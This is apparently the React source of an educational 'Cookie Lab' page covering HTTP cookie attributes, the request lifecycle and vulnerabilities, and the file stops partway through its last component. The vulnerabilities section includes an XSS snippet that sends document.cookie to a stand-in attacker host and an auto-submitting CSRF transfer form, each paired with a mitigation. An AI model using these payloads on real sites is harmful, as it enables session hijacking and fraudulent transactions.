"use client"

import { useState } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  ArrowLeft, Cookie, ShieldAlert, AlertTriangle, ChevronRight,
  Server, Globe, ArrowRight, CheckCircle2, Info, Lock,
  Eye, EyeOff, Clock, RefreshCw, Shield, Zap
} from "lucide-react"
import Link from "next/link"
import { cn } from "@/lib/utils"

type Tab = "basics" | "attributes" | "flow" | "vulnerabilities"

const TABS: { id: Tab; label: string }[] = [
  { id: "basics", label: "Basics" },
  { id: "attributes", label: "Attributes" },
  { id: "flow", label: "Request Flow" },
  { id: "vulnerabilities", label: "Vulnerabilities" },
]

export default function CookiePage() {
  const [tab, setTab] = useState<Tab>("basics")
  return (
    <main className="min-h-screen bg-[#0a0a0a] text-white p-4 sm:p-8 selection:bg-teal-500/30">
      <nav className="flex justify-between items-center mb-8 max-w-7xl mx-auto">
        <Link href="/" className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors group text-sm">
          <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
          Back to Dashboard
        </Link>
        <div className="px-4 py-1.5 rounded-full bg-teal-500/10 border border-teal-500/20 text-teal-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-2">
          <Cookie className="w-3 h-3" /> HTTP Cookies · RFC 6265
        </div>
      </nav>

      <div className="max-w-7xl mx-auto space-y-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
          <h1 className="text-5xl sm:text-6xl font-black tracking-tighter bg-linear-to-br from-white via-white to-teal-400 bg-clip-text text-transparent">
            Cookie Lab
          </h1>
          <p className="text-gray-500 text-sm leading-relaxed max-w-2xl">
            Everything about HTTP cookies — how they&apos;re set, stored, sent, and secured. From anatomy to XSS/CSRF attack vectors.
          </p>
        </motion.div>

        <div className="flex gap-2 flex-wrap pb-2 border-b border-white/5">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} className={cn(
              "px-5 py-2 rounded-full text-[11px] font-bold uppercase tracking-wider transition-all border",
              tab === t.id ? "bg-teal-600 border-teal-400 text-white shadow-lg shadow-teal-500/20" : "bg-white/5 border-white/10 text-gray-500 hover:border-white/20 hover:text-gray-200"
            )}>{t.label}</button>
          ))}
        </div>

        <AnimatePresence mode="wait">
          <motion.div key={tab} initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -16 }} transition={{ duration: 0.18 }}>
            {tab === "basics" && <BasicsTab />}
            {tab === "attributes" && <AttributesTab />}
            {tab === "flow" && <FlowTab />}
            {tab === "vulnerabilities" && <VulnerabilitiesTab />}
          </motion.div>
        </AnimatePresence>
      </div>
    </main>
  )
}

/* ════════════════════ BASICS ════════════════════ */
function BasicsTab() {
  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-teal-500/10 text-teal-400 border border-teal-500/20">
              <Cookie className="w-5 h-5" />
            </div>
            <h2 className="text-xl font-black tracking-tight">What is a Cookie?</h2>
          </div>
          <p className="text-sm text-gray-400 leading-relaxed">
            An HTTP cookie is a small piece of data that a <strong className="text-white">server sends to a browser</strong> via the <code className="text-teal-400">Set-Cookie</code> response header. The browser stores it and automatically includes it in <strong className="text-white">every subsequent request</strong> to the same domain via the <code className="text-teal-400">Cookie</code> request header.
          </p>
          <p className="text-sm text-gray-400 leading-relaxed">
            HTTP is a <em>stateless protocol</em> — each request is independent and the server has no memory of previous requests. Cookies solve this by giving the browser a &quot;memory card&quot; to carry between requests, enabling sessions, preferences, and authentication.
          </p>
          <div className="grid grid-cols-2 gap-3">
            {[
              { label: "Stateful HTTP", desc: "Maintains state across the stateless HTTP protocol" },
              { label: "Server-Set", desc: "Only servers can create cookies (Set-Cookie header)" },
              { label: "Auto-Sent", desc: "Browser attaches matching cookies to every request automatically" },
              { label: "Scoped", desc: "Domain + Path restricts which requests receive the cookie" },
            ].map(i => (
              <div key={i.label} className="p-4 rounded-2xl bg-black/30 border border-white/5 space-y-1">
                <p className="text-xs font-black text-teal-400 uppercase tracking-widest">{i.label}</p>
                <p className="text-[11px] text-gray-500 leading-relaxed">{i.desc}</p>
              </div>
            ))}
          </div>
        </div>

        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">The Set-Cookie Header (Server → Browser)</h3>
          <div className="bg-black/40 p-5 rounded-2xl border border-teal-500/10 font-mono text-xs space-y-2 leading-7">
            <p className="text-gray-600">// Server response headers:</p>
            <p><span className="text-gray-500">HTTP/2 200 OK</span></p>
            <p><span className="text-gray-500">Content-Type: application/json</span></p>
            <p>
              <span className="text-teal-400">Set-Cookie: </span>
              <span className="text-emerald-400">session_id</span>
              <span className="text-gray-500">=</span>
              <span className="text-white">abc123</span>
              <span className="text-gray-500">; </span>
              <span className="text-blue-400">HttpOnly</span>
              <span className="text-gray-500">; </span>
              <span className="text-blue-400">Secure</span>
              <span className="text-gray-500">; </span>
              <span className="text-violet-400">SameSite=Strict</span>
              <span className="text-gray-500">; </span>
              <span className="text-amber-400">Max-Age=3600</span>
              <span className="text-gray-500">; </span>
              <span className="text-rose-400">Path=/</span>
            </p>
          </div>
          <div className="space-y-2">
            {[
              { field: "session_id=abc123", color: "text-emerald-400", desc: "The cookie name and value. The core data being stored." },
              { field: "HttpOnly", color: "text-blue-400", desc: "Prevents JavaScript from reading the cookie (document.cookie). Blocks XSS cookie theft." },
              { field: "Secure", color: "text-blue-400", desc: "Cookie only sent over HTTPS connections. Prevents interception on HTTP." },
              { field: "SameSite=Strict", color: "text-violet-400", desc: "Controls when cookie is sent on cross-site requests. Prevents CSRF." },
              { field: "Max-Age=3600", color: "text-amber-400", desc: "Lifetime in seconds (1 hour). After this, browser deletes it." },
              { field: "Path=/", color: "text-rose-400", desc: "Cookie only sent for requests to paths beginning with /." },
            ].map(f => (
              <div key={f.field} className="flex gap-3 items-start p-3 rounded-xl bg-black/30 border border-white/5">
                <code className={cn("text-xs font-black font-mono shrink-0 w-36", f.color)}>{f.field}</code>
                <p className="text-[11px] text-gray-500 leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
        <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">Cookie Header (Browser → Server)</h3>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div>
            <div className="bg-black/40 p-5 rounded-2xl border border-emerald-500/10 font-mono text-xs leading-7">
              <p className="text-gray-600 mb-1">// Every subsequent request to example.com:</p>
              <p><span className="text-gray-500">GET /dashboard HTTP/2</span></p>
              <p><span className="text-gray-500">Host: example.com</span></p>
              <p><span className="text-emerald-400">Cookie: </span><span className="text-white">session_id=abc123; theme=dark; lang=en</span></p>
            </div>
          </div>
          <div className="space-y-3">
            <p className="text-sm text-gray-400 leading-relaxed">
              The browser automatically attaches <strong className="text-white">all matching cookies</strong> to every request — no JavaScript needed. This happens at the network level, invisibly.
            </p>
            <div className="p-4 rounded-xl bg-amber-500/5 border border-amber-500/15 flex gap-3">
              <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
              <p className="text-[12px] text-amber-300/70 leading-relaxed">This automatic sending is both the power and the danger of cookies — a CSRF attack exploits this by tricking the browser into sending cookies to an attacker-controlled destination.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ════════════════════ ATTRIBUTES ════════════════════ */
interface CookieConfig {
  httpOnly: boolean
  secure: boolean
  sameSite: "None" | "Lax" | "Strict"
  maxAge: number | null
  path: string
  domain: string
  partitioned: boolean
  prefix: "none" | "__Host-" | "__Secure-"
}

function AttributesTab() {
  const [cfg, setCfg] = useState<CookieConfig>({
    httpOnly: true,
    secure: true,
    sameSite: "Lax",
    maxAge: 3600,
    path: "/",
    domain: "",
    partitioned: false,
    prefix: "__Host-",
  })

  const cookieName = cfg.prefix !== "none" ? `${cfg.prefix}session` : "session"
  const cookieHeader = [
    `Set-Cookie: ${cookieName}=abc123xyz789`,
    cfg.path ? `Path=${cfg.path}` : null,
    cfg.domain ? `Domain=${cfg.domain}` : null,
    cfg.maxAge !== null ? `Max-Age=${cfg.maxAge}` : "Session (no Max-Age)",
    cfg.secure ? "Secure" : null,
    cfg.httpOnly ? "HttpOnly" : null,
    `SameSite=${cfg.sameSite}`,
    cfg.partitioned ? "Partitioned" : null,
  ].filter(Boolean).join("; ")

  const securityScore = [cfg.httpOnly, cfg.secure, cfg.sameSite !== "None", cfg.maxAge !== null, cfg.prefix !== "none"].filter(Boolean).length

  const scoreColor = securityScore >= 4 ? "text-emerald-400" : securityScore >= 2 ? "text-amber-400" : "text-red-400"
  const scoreLabel = securityScore >= 4 ? "Excellent" : securityScore >= 2 ? "Moderate" : "Vulnerable"

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Controls */}
        <div className="lg:col-span-1 glass p-6 rounded-[32px] border-white/5 space-y-5">
          <div className="flex justify-between items-center">
            <h3 className="text-sm font-black uppercase tracking-widest text-gray-500">Cookie Builder</h3>
            <div className={cn("text-[11px] font-black", scoreColor)}>
              {scoreLabel} ({securityScore}/5)
            </div>
          </div>

          {/* Toggles */}
          <div className="space-y-3">
            <AttrToggle
              label="HttpOnly"
              desc="Blocks JavaScript (document.cookie). Prevents XSS theft."
              value={cfg.httpOnly}
              onChange={v => setCfg(c => ({ ...c, httpOnly: v }))}
              good={true}
            />
            <AttrToggle
              label="Secure"
              desc="Only sent over HTTPS. Prevents network interception."
              value={cfg.secure}
              onChange={v => setCfg(c => ({ ...c, secure: v }))}
              good={true}
            />
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">SameSite</label>
            <div className="grid grid-cols-3 gap-1">
              {(["None", "Lax", "Strict"] as const).map(v => (
                <button key={v} onClick={() => setCfg(c => ({ ...c, sameSite: v }))} className={cn(
                  "py-2 rounded-xl text-[10px] font-black border transition-all",
                  cfg.sameSite === v ? (v === "None" ? "bg-red-600 border-red-400 text-white" : v === "Lax" ? "bg-amber-600 border-amber-400 text-white" : "bg-emerald-600 border-emerald-400 text-white") : "bg-white/5 border-white/5 text-gray-600 hover:border-white/20"
                )}>{v}</button>
              ))}
            </div>
            <p className="text-[11px] text-gray-600 leading-relaxed">
              {cfg.sameSite === "None" && "⚠ Cookie sent with ALL cross-site requests. CSRF vulnerable. Requires Secure flag."}
              {cfg.sameSite === "Lax" && "↕ Sent on top-level navigation GET requests. Blocks most CSRF. Browser default."}
              {cfg.sameSite === "Strict" && "✅ Never sent on cross-site requests. Maximum CSRF protection."}
            </p>
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">Max-Age (seconds)</label>
            <div className="grid grid-cols-4 gap-1">
              {[null, 3600, 86400, 2592000].map(v => (
                <button key={String(v)} onClick={() => setCfg(c => ({ ...c, maxAge: v }))} className={cn(
                  "py-2 rounded-xl text-[10px] font-black border transition-all",
                  cfg.maxAge === v ? "bg-teal-600 border-teal-400 text-white" : "bg-white/5 border-white/5 text-gray-600 hover:border-white/20"
                )}>{v === null ? "Session" : v === 3600 ? "1hr" : v === 86400 ? "1day" : "30d"}</button>
              ))}
            </div>
            <p className="text-[11px] text-gray-600">{cfg.maxAge === null ? "Deleted when browser tab closes (session cookie)." : `Persists for ${cfg.maxAge >= 86400 ? Math.floor(cfg.maxAge / 86400) + " day(s)" : cfg.maxAge / 3600 + " hour(s)"} after creation.`}</p>
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">Cookie Name Prefix</label>
            <div className="space-y-1">
              {[
                { v: "none" as const, label: "No prefix", desc: "Plain name. Domain/Path can be set freely." },
                { v: "__Secure-" as const, label: "__Secure-", desc: "Requires Secure flag." },
                { v: "__Host-" as const, label: "__Host-", desc: "Requires Secure, no Domain, Path=/." },
              ].map(opt => (
                <button key={opt.v} onClick={() => setCfg(c => ({ ...c, prefix: opt.v }))} className={cn(
                  "w-full flex gap-3 items-center p-3 rounded-xl border text-left transition-all",
                  cfg.prefix === opt.v ? "bg-teal-500/10 border-teal-500/30 text-white" : "bg-white/3 border-white/5 text-gray-500 hover:border-white/10"
                )}>
                  <code className="text-[11px] font-mono text-teal-400 w-24 shrink-0">{opt.label}</code>
                  <p className="text-[11px]">{opt.desc}</p>
                </button>
              ))}
            </div>
          </div>

          <AttrToggle
            label="Partitioned (CHIPS)"
            desc="Isolates cookie to the top-level site context. Third-party cookie replacement."
            value={cfg.partitioned}
            onChange={v => setCfg(c => ({ ...c, partitioned: v }))}
            good={true}
          />
        </div>

        {/* Output */}
        <div className="lg:col-span-2 space-y-6">
          <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
            <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-500">Generated Set-Cookie Header</h3>
            <div className="bg-black/60 p-5 rounded-2xl border border-teal-500/10 font-mono text-xs text-teal-300 leading-relaxed break-all">
              {cookieHeader}
            </div>
            <div className="flex flex-wrap gap-2">
              {[
                { label: "HttpOnly", active: cfg.httpOnly, good: true, tooltip: "Blocks XSS theft" },
                { label: "Secure", active: cfg.secure, good: true, tooltip: "HTTPS only" },
                { label: `SameSite=${cfg.sameSite}`, active: true, good: cfg.sameSite !== "None", tooltip: "CSRF protection" },
                { label: "Has Expiry", active: cfg.maxAge !== null, good: true, tooltip: "Token expires" },
                { label: "Prefix set", active: cfg.prefix !== "none", good: true, tooltip: "Subdomain attack protection" },
                { label: "Partitioned", active: cfg.partitioned, good: true, tooltip: "Cross-site isolation" },
              ].map(b => (
                <div key={b.label} title={b.tooltip} className={cn("px-3 py-1.5 rounded-full text-[10px] font-black border flex items-center gap-1.5",
                  b.active && b.good ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-400" :
                  !b.active ? "bg-white/5 border-white/10 text-gray-600" : "bg-red-500/15 border-red-500/30 text-red-400"
                )}>
                  {b.active ? <CheckCircle2 className="w-2.5 h-2.5" /> : <span className="w-2.5 h-2.5 rounded-full bg-current opacity-30 inline-block" />}
                  {b.label}
                </div>
              ))}
            </div>
          </div>

          {/* Deep dives */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="glass p-6 rounded-[24px] border-white/5 space-y-3">
              <div className="flex items-center gap-2">
                <EyeOff className="w-4 h-4 text-blue-400" />
                <h4 className="text-sm font-black text-blue-400">HttpOnly in Practice</h4>
              </div>
              <div className="font-mono text-[11px] bg-black/40 p-4 rounded-xl border border-white/5 space-y-2">
                <p className="text-gray-600">// With HttpOnly OFF:</p>
                <p className="text-red-400">document.cookie // → "session=abc123"</p>
                <p className="text-gray-700 mt-2">// With HttpOnly ON:</p>
                <p className="text-emerald-400">document.cookie // → "" (empty!)</p>
              </div>
              <p className="text-[12px] text-gray-500 leading-relaxed">The HttpOnly cookie is still sent on network requests — it&apos;s invisible to JavaScript only.</p>
            </div>
            <div className="glass p-6 rounded-[24px] border-white/5 space-y-3">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4 text-violet-400" />
                <h4 className="text-sm font-black text-violet-400">SameSite Deep Dive</h4>
              </div>
              <div className="space-y-2 text-[11px]">
                <div className="p-2 rounded-lg bg-red-500/10 border border-red-500/20">
                  <p className="text-red-400 font-bold">None</p>
                  <p className="text-gray-500">All cross-site requests include cookie. Needed for third-party embeds. Must use Secure.</p>
                </div>
                <div className="p-2 rounded-lg bg-amber-500/10 border border-amber-500/20">
                  <p className="text-amber-400 font-bold">Lax (Default)</p>
                  <p className="text-gray-500">Only top-level GET requests include cookie cross-site. Blocks most CSRF.</p>
                </div>
                <div className="p-2 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                  <p className="text-emerald-400 font-bold">Strict</p>
                  <p className="text-gray-500">Cookie NEVER sent cross-site. Maximum security. May affect OAuth/SSO flows.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

function AttrToggle({ label, desc, value, onChange, good }: { label: string; desc: string; value: boolean; onChange: (v: boolean) => void; good: boolean }) {
  return (
    <button onClick={() => onChange(!value)} className={cn(
      "w-full flex items-center justify-between p-4 rounded-2xl border transition-all text-left",
      value && good ? "bg-emerald-500/10 border-emerald-500/30" : !value && good ? "bg-red-500/5 border-red-500/20 hover:border-red-500/30" : "bg-white/5 border-white/5 hover:border-white/10"
    )}>
      <div className="flex-1">
        <p className={cn("text-[11px] font-black", value && good ? "text-emerald-400" : !value && good ? "text-red-400" : "text-gray-400")}>{label}</p>
        <p className="text-[10px] text-gray-600 leading-relaxed mt-0.5">{desc}</p>
      </div>
      <div className={cn("w-8 h-5 rounded-full relative transition-all shrink-0 ml-4", value ? "bg-emerald-500" : "bg-white/10")}>
        <div className={cn("absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-all", value ? "left-3.5" : "left-0.5")} />
      </div>
    </button>
  )
}

/* ════════════════════ REQUEST FLOW ════════════════════ */
const REQUEST_STEPS = [
  {
    id: 1, phase: "First Visit",
    from: "Browser", to: "Server (example.com)",
    req: "GET / HTTP/2\nHost: example.com\n(No Cookie header — first visit)",
    res: "HTTP/2 200 OK\nSet-Cookie: session_id=abc123xyz; HttpOnly; Secure; SameSite=Lax; Max-Age=3600",
    desc: "The user visits the site for the first time. No cookies exist yet. The server sends back Set-Cookie headers to create cookies in the browser.",
    detail: "The server generates a unique session ID (abc123xyz), stores it server-side linked to a user session record, and sends the ID to the browser. The browser stores it as a cookie.",
    highlight: "Set-Cookie header → Browser stores cookie in its cookie jar",
  },
  {
    id: 2, phase: "Login",
    from: "Browser", to: "Server (example.com)",
    req: "POST /login HTTP/2\nCookie: session_id=abc123xyz\nContent-Type: application/json\n\n{ email: 'alice@example.com', password: '...' }",
    res: "HTTP/2 200 OK\nSet-Cookie: session_id=xyz789abc; HttpOnly; Secure; SameSite=Strict; Max-Age=86400\n\n{ user: { name: 'Alice', role: 'user' } }",
    desc: "The browser automatically includes the existing session cookie in the login request. After successful login, the server regenerates the session ID (prevents session fixation attacks).",
    detail: "Session regeneration after login is critical. If the session ID stays the same before and after authentication, an attacker who knew the pre-auth session ID gains access to the post-auth session.",
    highlight: "Server regenerates session_id after login → prevents session fixation",
  },
  {
    id: 3, phase: "Authenticated Request",
    from: "Browser", to: "Server (example.com)",
    req: "GET /api/profile HTTP/2\nHost: example.com\nCookie: session_id=xyz789abc; theme=dark",
    res: "HTTP/2 200 OK\n\n{ name: 'Alice', email: 'alice@example.com', balance: '$1,234.56' }",
    desc: "Every subsequent request to example.com automatically carries the session cookie. The server looks up the session ID in its session store to identify Alice without her having to re-authenticate.",
    detail: "This is what makes web sessions feel seamless. The browser sends cookies on every request to matching domains — including images, API calls, redirects. All without any JavaScript involvement.",
    highlight: "Cookie sent automatically on EVERY request to matching domain",
  },
  {
    id: 4, phase: "Cross-Origin Request",
    from: "Browser", to: "api.other.com",
    req: "POST /api/data HTTP/2\nHost: api.other.com\nOrigin: example.com\n\n(Cookie: session_id — NOT sent! SameSite=Lax/Strict)",
    res: "HTTP/2 200 OK\n(api.other.com sees no cookie — cannot impersonate you)",
    desc: "When the browser makes a request to a different domain (api.other.com), SameSite=Lax/Strict prevents the session cookie from being included. This blocks CSRF attacks.",
    detail: "SameSite is the modern defense against CSRF. A malicious page at evil.com can't trick the browser into including your example.com cookies when making requests to example.com, because SameSite blocks cross-site cookie sending.",
    highlight: "SameSite blocks cookie on cross-origin requests → CSRF prevented",
  },
  {
    id: 5, phase: "Logout / Expiry",
    from: "Browser", to: "Server (example.com)",
    req: "POST /logout HTTP/2\nCookie: session_id=xyz789abc",
    res: 'HTTP/2 200 OK\nSet-Cookie: session_id=; Max-Age=0; Path=/; Secure; HttpOnly\n//                        ↑ Max-Age=0 immediately deletes the cookie',
    desc: "To delete a cookie, the server sends Set-Cookie with the same name but Max-Age=0 (or an Expires in the past). The browser removes it from its cookie jar immediately.",
    detail: "Session cookies (no Max-Age/Expires) are deleted when the browser closes. Persistent cookies survive browser restart until their Max-Age expires. Both can be force-deleted by the server.",
    highlight: "Max-Age=0 deletes the cookie — browser removes it immediately",
  },
]

function FlowTab() {
  const [step, setStep] = useState(0)
  const current = REQUEST_STEPS[step]

  return (
    <div className="space-y-6">
      <div className="glass p-5 rounded-[32px] border-white/5 flex gap-3">
        <Info className="w-4 h-4 text-teal-400 shrink-0 mt-0.5" />
        <p className="text-sm text-gray-400 leading-relaxed">
          This simulation shows the complete cookie lifecycle — from first visit to logout — including how cookies are automatically attached to every request.
        </p>
      </div>

      <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
        <div className="flex gap-1">
          {REQUEST_STEPS.map((s, i) => (
            <button key={s.id} onClick={() => setStep(i)} className={cn("flex-1 h-1.5 rounded-full transition-all", i === step ? "bg-teal-500" : i < step ? "bg-teal-500/40" : "bg-white/10")} />
          ))}
        </div>
        <div className="flex justify-between items-center">
          <div>
            <span className="text-[10px] font-black uppercase tracking-widest text-gray-600">Phase {step + 1}/{REQUEST_STEPS.length}: </span>
            <span className="text-[10px] font-black uppercase tracking-widest text-teal-400">{current.phase}</span>
          </div>
          <div className="flex gap-2">
            <button onClick={() => setStep(s => Math.max(0, s - 1))} disabled={step === 0} className="px-4 py-1.5 rounded-full bg-white/5 border border-white/10 text-xs text-gray-500 hover:text-white disabled:opacity-30 transition-all">← Prev</button>
            <button onClick={() => setStep(s => Math.min(REQUEST_STEPS.length - 1, s + 1))} disabled={step === REQUEST_STEPS.length - 1} className="px-4 py-1.5 rounded-full bg-teal-600 border border-teal-400 text-xs text-white hover:bg-teal-500 transition-all disabled:opacity-30">Next →</button>
          </div>
        </div>
      </div>

      <AnimatePresence mode="wait">
        <motion.div key={step} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} transition={{ duration: 0.2 }}>
          <div className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="glass p-6 rounded-[32px] border-white/5 flex flex-col items-center justify-center text-center gap-3">
                <div className="w-14 h-14 rounded-full bg-blue-500/10 border border-blue-500/20 flex items-center justify-center">
                  <Globe className="w-6 h-6 text-blue-400" />
                </div>
                <p className="text-sm font-black text-blue-400">{current.from}</p>
              </div>
              <div className="glass p-5 rounded-[32px] border-teal-500/10 bg-teal-500/5 flex flex-col items-center justify-center gap-3">
                <ArrowRight className="w-7 h-7 text-teal-400 animate-pulse" />
                <div className="px-5 py-2 rounded-2xl bg-black/40 border border-teal-500/10">
                  <p className="text-[10px] font-black uppercase tracking-widest text-teal-400">{current.phase}</p>
                </div>
              </div>
              <div className="glass p-6 rounded-[32px] border-white/5 flex flex-col items-center justify-center text-center gap-3">
                <div className="w-14 h-14 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
                  <Server className="w-6 h-6 text-emerald-400" />
                </div>
                <p className="text-sm font-black text-emerald-400">{current.to}</p>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="glass p-6 rounded-[24px] border-white/5 space-y-3">
                <p className="text-[10px] font-black uppercase tracking-widest text-blue-500">Request (Browser → Server)</p>
                <pre className="bg-black/60 border border-blue-500/10 rounded-xl p-4 text-xs font-mono text-blue-300 whitespace-pre-wrap leading-relaxed">{current.req}</pre>
              </div>
              <div className="glass p-6 rounded-[24px] border-white/5 space-y-3">
                <p className="text-[10px] font-black uppercase tracking-widest text-emerald-500">Response (Server → Browser)</p>
                <pre className="bg-black/60 border border-emerald-500/10 rounded-xl p-4 text-xs font-mono text-emerald-300 whitespace-pre-wrap leading-relaxed">{current.res}</pre>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="glass p-6 rounded-[24px] border-white/5 space-y-2">
                <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">What&apos;s happening</p>
                <p className="text-sm text-gray-300 leading-relaxed">{current.desc}</p>
              </div>
              <div className="space-y-4">
                <div className="glass p-5 rounded-[24px] border-teal-500/10 space-y-2">
                  <p className="text-[10px] font-black uppercase tracking-widest text-teal-500">Technical detail</p>
                  <p className="text-sm text-gray-400 leading-relaxed">{current.detail}</p>
                </div>
                <div className="p-4 rounded-2xl bg-teal-500/5 border border-teal-500/15 flex gap-3">
                  <Zap className="w-4 h-4 text-teal-400 shrink-0" />
                  <p className="text-[12px] text-teal-300/70 font-semibold leading-relaxed">{current.highlight}</p>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      </AnimatePresence>
    </div>
  )
}

/* ════════════════════ VULNERABILITIES ════════════════════ */
const VULNS = [
  {
    id: "xss-theft", severity: "CRITICAL", color: "red",
    title: "XSS Cookie Theft (Missing HttpOnly)",
    summary: "If HttpOnly flag is missing, any JavaScript running on the page can read the session cookie and send it to an attacker's server — stealing the entire session.",
    attack: `// Attacker injects JS via XSS vulnerability:\n<script>\n  // Without HttpOnly, this works!\n  const stolen = document.cookie;\n  // Gets: "session_id=abc123xyz; theme=dark"\n\n  // Exfiltrate to attacker's server:\n  new Image().src =\n    'https://evil.attacker.com/steal?c='\n    + encodeURIComponent(stolen);\n</script>\n\n// Attacker now has your session cookie.\n// They paste it into their browser → instant access.`,
    mitigation: "Always use the HttpOnly flag on authentication and session cookies. With HttpOnly, document.cookie returns an empty string — the cookie exists but is inaccessible to JavaScript. XSS can still do damage, but can't steal cookies.",
  },
  {
    id: "csrf", severity: "HIGH", color: "orange",
    title: "Cross-Site Request Forgery (CSRF)",
    summary: "If SameSite is not properly set, an attacker can trick a victim's browser into making authenticated requests to their bank/app from a malicious page.",
    attack: `<!-- Attacker's page: evil.com -->\n<!-- victim has active session at mybank.com -->\n<html>\n  <body onload="document.csrf.submit()">\n    <form name="csrf"\n      action="https://mybank.com/transfer"\n      method="POST">\n      <input name="to" value="attacker_account">\n      <input name="amount" value="5000">\n    </form>\n  </body>\n</html>\n\n// Browser automatically sends mybank.com cookies!\n// Without SameSite=Strict/Lax, transfer succeeds.`,
    mitigation: "Use SameSite=Strict or SameSite=Lax. Also implement synchronizer CSRF tokens (random value in form + cookie, server validates they match). Defense in depth: both SameSite AND CSRF tokens.",
  },
  {
    id: "session-fixation", severity: "HIGH", color: "orange",
    title: "Session Fixation",
    summary: "If the server doesn't regenerate the session ID after login, an attacker who knows the pre-login session ID gains access to the authenticated session.",
    attack: `// Phase 1 — Attacker gets a pre-auth session:\n// Attacker visits app → gets session_id=KNOWN123\n\n// Phase 2 — Attacker tricks victim into using it:\n// Sets victim's cookie to session_id=KNOWN123\n// (via XSS, URL parameter, or subdomain)\n\n// Phase 3 — Victim logs in:\n// Victim authenticates with session_id=KNOWN123\n// Server DOES NOT regenerate session ID!\n// session_id=KNOWN123 is now authenticated.\n\n// Attacker uses session_id=KNOWN123 → logged in!`,
    mitigation: "Always regenerate the session ID after successful authentication. Create a completely new session ID post-login, invalidate the old one. This is standard in all major session libraries.",
  },
  {
    id: "no-secure", severity: "MEDIUM", color: "yellow",
    title: "Missing Secure Flag (HTTP Transmission)",
    summary: "Without the Secure flag, cookies are sent over both HTTP and HTTPS. An attacker on the same network (coffee shop WiFi) can intercept cookies via HTTP requests.",
    attack: `// Without Secure flag:\n\n// User visits http://myapp.com/login (not HTTPS!)\n// Browser sends: Cookie: session_id=abc123\n//   ↓ transmitted in plaintext over HTTP\n\n// Attacker on same WiFi runs Wireshark:\n// Captures: GET / HTTP/1.1\n//           Cookie: session_id=abc123\n\n// Attacker now has the session cookie.\n// Can replay it in their browser for full access.`,
    mitigation: "Use the Secure flag on all sensitive cookies. Even better: enable HSTS (HTTP Strict Transport Security) to force HTTPS for all requests to your domain, preventing the HTTP downgrade entirely.",
  },
  {
    id: "cookie-poisoning", severity: "MEDIUM", color: "yellow",
    title: "Cookie Poisoning / Unsigned Cookies",
    summary: "If cookie values are trusted without cryptographic verification, an attacker can manually edit their cookies to change their role, preferences, or other application state.",
    attack: `// Application stores role in a plaintext cookie:\nSet-Cookie: role=user\n\n// Attacker opens DevTools → Application → Cookies\n// Manually edits: role=admin\n\n// Next request:\nCookie: role=admin\n\n// If server trusts cookie value without validation:\n// Attacker now has admin privileges!`,
    mitigation: "Never trust cookie values for security decisions without verification. Use signed cookies (HMAC) or store sensitive data server-side in a session store, with only a session ID in the cookie.",
  },
  {
    id: "subdomain", severity: "MEDIUM", color: "yellow",
    title: "Subdomain Cookie Hijacking",
    summary: "Cookies set with Domain=.example.com are accessible from all subdomains — including attacker-controlled ones like evil.example.com.",
    attack: `// Server sets cookie with broad domain:\nSet-Cookie: session=abc; Domain=.example.com\n\n// This cookie is sent to:\n//   example.com ✓ (intended)\n//   api.example.com ✓ (ok)\n//   evil.example.com ✓ (dangerous!)\n\n// If attacker can create a subdomain\n// (via XSS or subdomain takeover):\n// They receive the session cookie!\n\n// __Host- prefix prevents this:\n// Requires Secure, no Domain, Path=/ only.`,
    mitigation: "Use the __Host- cookie prefix (requires Secure, no Domain attribute, Path=/) to prevent cookies from being sent to subdomains. Audit all subdomain access — a compromised subdomain is your worst enemy.",
  },
]

function VulnerabilitiesTab() {
  const [expanded, setExpanded] = useState<string | null>("xss-theft")
  const badge = (s: string) => s === "CRITICAL" ? "bg-red-500/20 text-red-400 border-red-500/30" : s === "HIGH" ? "bg-orange-500/20 text-orange-400 border-orange-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
